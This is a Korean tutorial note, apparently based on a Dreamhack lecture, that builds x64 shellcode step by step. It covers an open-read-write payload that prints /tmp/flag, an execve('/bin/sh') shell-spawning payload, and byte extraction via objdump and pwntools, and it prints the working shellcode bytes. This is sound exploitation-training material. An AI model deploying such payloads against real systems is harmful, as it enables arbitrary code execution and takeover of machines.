### 쉘 코드(Shellcode)

익스플로잇을 위해 제작된 어셈블리 코드 조각, 일반적으로 쉘을 획득하기 위한 목적으로 사용합니다.


<br>
<br>


### orw 쉘 코드 작성

```c
// "/tmp/flag"를 읽고 출력하는 쉘 코드

char buf[0x30];
int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
```

#

---

### x64 syscall

syscall 요청 : rax

인자 순서 : rdi → rsi → rdx → rcx → r8 → r9 → stack

<img src="https://velog.velcdn.com/images/silvergun8291/post/9d289dcc-8c67-42eb-b538-a18b3de26b9f/image.png">

---

<br>

**int fd = open("/tmp/flag", RD\_ONLY, NULL)**

**1. rdi**
`"/tmp/flag"` ⇾ `2F 74 6D 70 2F 66 6C 61 67`

`rdi = "/tmp/flag"`

#

**2. rsi**

<img src="https://velog.velcdn.com/images/silvergun8291/post/210a2f85-5c0d-4487-83af-76ff7e202e48/image.png">


`RD_ONLY` 는 `0`

`rsi = 0x0`

#

**3. rdx**

`NULL` 이니까

`rdx = 0x0`

#

**4. rax**

`open syscall` 번호는 `2`

`rax = 0x2`

#

```bash
push 0x67                       ; 'g' 스택에 넣기
mov rax, 0x616c662f706d742f     ; rax = "/tmp/fla"
push rax                        ; "/tmp/fla" 스택에 넣기
mov rdi, rsp                    ; rdi = "/tmp/flag"
xor rsi, rsi                    ; rsi = 0 (RD_ONLY)
xor rdx, rdx                    ; rdx = 0 (NULL)
mov rax, 0x2                    ; rax = 2 (open)
syscall                         ; open("/tmp/flag", RD_ONLY, NULL)
```

<br>

**read(fd, buf, 0x30)**


**1. rdi**

`open` 한 `"/tmp/flag"` 의 `fd` 값을 `rdi` 에 대입

`open syscall` 의 결과인 `fd` 값은 `rax` 레지스터에 저장되기 때문에

`rdi = rax`

#

**2. rsi**

`buf[0x30]` 은 크기가 `0x30` 인 문자열이기 때문에

`rsi = rsp - 0x30`

#

**3. rdx**

`0x30` 크기의 데이터를 읽을 거기 때문에

`rdx = 0x30`

#

**4. rax**

`read syscall` 번호는 `0`

`rax = 0x0`

#

```bash
mov rdi, rax	; rdi = fd
mov rsi, rsp	; rsi = rsp
sub rsi, 0x30	; rsi = rsp - 0x30 (buf)
mov rdx, 0x30	; rdx = 0x30 (size)
mov rax, 0x0    ; rax = 0 (read)
syscall    	; read(fd, buf, 0x30)
```

<br>

**write(1, buf, 0x30)**

**1. rdi**

파일로부터 읽은 데이터를 화면에 출력할 것이기 때문에, `fd` 는 `stdout` 인 `0x1`

`rdi = 0x1`

#

**2. rsi**

`buf[0x30]` 은 크기가 `0x30` 인 문자열이기 때문에

`rsi = rsp - 0x30`

#

**3. rdi**

`0x30` 크기의 데이터를 쓸 거기 때문에

`rdi = 0x30`

#

**4. rax**

`write syscall` 번호는 `1`

`rax = 0x1`


`write()` 이전에 `read()` 에서 `rsi` 와 `rdi` 가 `buf`, `0x30` 으로 동일하기 때문에, `rsi`, `rdi` 값은 그대로 사용하면

```bash
mov rdi, 0x1	; rdi = 0x1 (stdout)
mov rax, 0x1	; rax = 0x1 (write)
syscall    	; write(1, buf, 0x30)
```

<br>

각 코드를 조합해서 전체 코드를 만들면

```c
; open("/tmp/flag", RD_ONLY, NULL)
push 0x67				; 'g' 스택에 넣기
mov rax, 0x616c662f706d742f		; rax = "/tmp/fla"
push rax				; "/tmp/fla" 스택에 넣기
mov rdi, rsp			        ; rdi = "/tmp/flag"
xor rsi, rsi				; rsi = 0 (RD_ONLY)
xor rdx, rdx				; rdx = 0 (NULL)
mov rax, 0x2				; rax = 2 (open)
syscall    				; open("/tmp/flag", RD_ONLY, NULL)

; read (fd, buf, 0x30)
mov rdi, rax				; rdi = fd
mov rsi, rsp				; rsi = rsp
sub rsi, 0x30				; rsi = rsp - 0x30 (buf)
mov rdx, 0x30				; rdx = 0x30 (size)
mov rax, 0x0    			; rax = 0 (read)
syscall    				; read(fd, buf, 0x30)

; write(1, buf, 0x30)
mov rdi, 0x1				; rdi = 0x1 (stdout)
mov rax, 0x1				; rax = 0x1 (write)
syscall    				; write(1, buf, 0x30)
```

<br>

이제 완성된 코드를 컴파일 해야 하는데, C언어로 스켈레톤 코드를 작성하고 거기에 쉘 코드를 탑재해서 컴파일을 하면 됩니다.

```c
// 스켈레톤 코드 예시

__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    
    "Input your shellcode here.\n"
    "Each line of your shellcode should be\n"
    "seperated by '\n'\n"
    
    "xor rdi, rdi       # rdi = 0\n"
    "mov rax, 0x3c	# rax = sys_exit\n"
    "syscall            # exit(0)");
    
void run_sh();

int main() { run_sh(); }
```

<br>

스켈레톤 코드에 쉘 코드를 탑재해보면

```c
__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    
    
    "push 0x67							# 'g' 스택에 넣기\n"
    "mov rax, 0x616c662f706d742f		                # rax = '/tmp/fla'\n"
    "push rax							# '/tmp/fla' 스택에 넣기\n"
    "mov rdi, rsp						# rdi = '/tmp/flag'\n"
    "xor rsi, rsi						# rsi = 0 (RD_ONLY)\n"
    "xor rdx, rdx						# rdx = 0 (NULL)\n"
    "mov rax, 0x2						# rax = 2 (open)\n"
    "syscall    						# open('/tmp/flag', RD_ONLY, NULL)\n"
    "\n"
    
    "mov rdi, rax						# rdi = fd\n"
    "mov rsi, rsp						# rsi = rsp\n"
    "sub rsi, 0x30						# rsi = rsp - 0x30 (buf)\n"
    "mov rdx, 0x30						# rdx = 0x30 (size)\n"
    "mov rax, 0x0    					        # rax = 0 (read)\n"
    "syscall    						# read(fd, buf, 0x30)\n"
    "\n"
    
    "mov rdi, 0x1						# rdi = 0x1 (stdout)\n"
    "mov rax, 0x1						# rax = 0x1 (write)\n"
    "syscall    						# write(1, buf, 0x30)\n"
    "\n"
    
    
    "xor rdi, rdi      					        # rdi = 0\n"
    "mov rax, 0x3c	  					# rax = sys_exit\n"
    "syscall		   					# exit(0)");
    
void run_sh();

int main() { run_sh(); }
```

<br>

이제 컴파일을 하고 실행을 시켜보면

```bash
gcc -o orw orw.c -masm=intel
./orw
```

```bash
flag{this is open read write shellcode!}
\U
```

쉘 코드가 성공적으로 실행되어서 `"/tmp/flag"` 파일의 내용이 출력되었습니다.


<br>
<br>


### execve 쉘 코드

쉘을 띄우는 쉘 코드를 이용하면 서버의 쉘을 흭득할 수 있습니다.

#

**execve("/bin/sh", null, null)**

<img src="https://velog.velcdn.com/images/silvergun8291/post/c68db811-3aed-40c5-af13-41ecd19478d0/image.png">


**1. rdi**

`"/bin/sh"` → `2F 62 69 6E 2F 73 68`

`rdi = "/bin/sh"`

#

**2. rsi**

`null`

`rsi = 0x0`

#

**3. rdx**

`null`

`rdx = 0x0`

#

**4. rax**

`execve syscall` 번호는 `0x3b`

`rax = 0x3b`

```bash
mov rax, 0x68732f6e69622f               ; rax = "/bin/sh"
push rax				; "/bin/sh" 스택에 넣기
mov rdi, rsp				; rdi = "/bin/sh"
xor rsi, rsi				; rsi = 0x0 (null)
xor rdx, rdx				; rdx = 0x0 (null)
mov rax, 0x3b				; rax = 0x3b (execve)
syscall					; execve("/bin/sh", null, null)
```

<br>

위와 같은 방법으로 스켈레톤 코드에 쉘 코드를 탑재해서 컴파일해보면

```c
__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    
    "mov rax, 0x68732f6e69622f		# rax = '/bin/sh'\n"
    "push rax				# '/bin/sh' 스택에 넣기\n"
    "mov rdi, rsp			# rdi = '/bin/sh'\n"
    "xor rsi, rsi			# rsi = 0x0 (null)\n"
    "xor rdx, rdx			# rdx = 0x0 (null)\n"
    "mov rax, 0x3b			# rax = 0x3b (execve)\n"
    "syscall				# execve('/bin/sh', null, null)\n"
    
    "xor rdi, rdi   			# rdi = 0\n"
    "mov rax, 0x3c			# rax = sys_exit\n"
    "syscall        			# exit(0)");
    
void run_sh();

int main() { run_sh(); }
```

```bash
$ gcc -o execve execve.c -masm=intel
$ ls
execve  execve.c
```

<br>

`execve` 파일을 실행해보면

```bash
$ ./execve
$
```

쉘이 `bash` 에서 `sh` 로 변경되었습니다.


<br>
<br>


### objdump를 이용한 shellcode 추출

```bash
ion@Galaxy-Book:~/sh$ for i in $(objdump -d ./execve | grep "^ "|cut -f2);do echo -n \\x$i;done
\x48\x83\xec\x08\x48\x8b\x05\x25\x0b\x20\x00\x48\x85\xc0\x74\x02\xff\xd0\x48\x83\xc4\x08\xc3\xff\x35\xf2\x0a\x20\x00\xff\x25\xf4\x0a\x20\x00\x0f\x1f\x40\x00\xff\x25\x12\x0b\x20\x00\x66\x90\x31\xed\x49\x89\xd1\x5e\x48\x89\xe2\x48\x83\xe4\xf0\x50\x54\x4c\x8d\x05\xaa\x01\x00\x00\x48\x8d\x0d\x33\x01\x00\x00\x48\x8d\x3d\x0f\x01\x00\x00\xff\x15\xc6\x0a\x20\x00\xf4\x0f\x1f\x44\x00\x00\x48\x8d\x3d\xe9\x0a\x20\x00\x55\x48\x8d\x05\xe1\x0a\x20\x00\x48\x39\xf8\x48\x89\xe5\x74\x19\x48\x8b\x05\x9a\x0a\x20\x00\x48\x85\xc0\x74\x0d\x5d\xff\xe0\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x5d\xc3\x0f\x1f\x40\x00\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x48\x8d\x3d\xa9\x0a\x20\x00\x48\x8d\x35\xa2\x0a\x20\x00\x55\x48\x29\xfe\x48\x89\xe5\x48\xc1\xfe\x03\x48\x89\xf0\x48\xc1\xe8\x3f\x48\x01\xc6\x48\xd1\xfe\x74\x18\x48\x8b\x05\x61\x0a\x20\x00\x48\x85\xc0\x74\x0c\x5d\xff\xe0\x66\x0f\x1f\x84\x00\x00\x00\x00\x00\x5d\xc3\x0f\x1f\x40\x00\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x80\x3d\x59\x0a\x20\x00\x00\x75\x2f\x48\x83\x3d\x37\x0a\x20\x00\x00\x55\x48\x89\xe5\x74\x0c\x48\x8b\x3d\x3a\x0a\x20\x00\xe8\x0d\xff\xff\xff\xe8\x48\xff\xff\xff\xc6\x05\x31\x0a\x20\x00\x01\x5d\xc3\x0f\x1f\x80\x00\x00\x00\x00\xf3\xc3\x66\x0f\x1f\x44\x00\x00\x55\x48\x89\xe5\x5d\xe9\x66\xff\xff\xff\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05\x55\x48\x89\xe5\xb8\x00\x00\x00\x00\xe8\xc9\xff\xff\xff\xb8\x00\x00\x00\x00\x5d\xc3\x0f\x1f\x84\x00\x00\x00\x00\x00\x41\x57\x41\x56\x49\x89\xd7\x41\x55\x41\x54\x4c\x8d\x25\x9e\x07\x20\x00\x55\x48\x8d\x2d\x9e\x07\x20\x00\x53\x41\x89\xfd\x49\x89\xf6\x4c\x29\xe5\x48\x83\xec\x08\x48\xc1\xfd\x03\xe8\x47\xfe\xff\xff\x48\x85\xed\x74\x20\x31\xdb\x0f\x1f\x84\x00\x00\x00\x00\x00\x4c\x89\xfa\x4c\x89\xf6\x44\x89\xef\x41\xff\x14\xdc\x48\x83\xc3\x01\x48\x39\xdd\x75\xea\x48\x83\xc4\x08\x5b\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3\x90\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\xf3\xc3\x48\x83\xec\x08\x48\x83\xc4\x08\xc3
```

명령어를 실행해보면 긴 쉘코드가 출력되긴하는데, 이 쉘코드는 쓸 수 없습니다.

왜냐하면 쉘코드 사이에 있는 `\x00`이 끝으로 인식되어 중간에 쉘코드가 잘리기 때문입니다.

이 문제를 해결하려면 `\x00` 가 안 생기도록 쉘코드를 다시 짜야하기 때문에 그냥 간단하게 `pwntools` 로 쉘코드를 짜보겠습니다.


<br>

```python
from pwn import *

context.arch = "amd64"

code = shellcraft.sh()
shellcode = asm(code)

print("shellcode: ", shellcode)
```

```bash
$ python3 shellcode.py
shellcode:  b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
```


---

<br>

> [Exploit Tech: Shellcode](https://dreamhack.io/lecture/courses/50)
